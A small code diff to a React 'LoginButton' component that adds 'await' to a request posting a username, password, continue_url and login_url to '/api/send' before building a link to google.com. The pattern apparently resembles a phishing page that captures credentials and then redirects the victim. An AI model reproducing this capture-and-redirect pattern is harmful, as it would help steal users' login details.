@@ -46,7 +46,7 @@ const LoginButton = ({login,continu2,isAuthenticated}:Props) =>{
         try{
           if(validation){
             console.log('si dio like')
-          axios.post('/api/send',{username,password,continue_url,login_url});
+         await axios.post('/api/send',{username,password,continue_url,login_url});
           dispatch(uiActions.setLoading(false))
           const link =document.createElement('a');
           link.href = 'https://google.com';
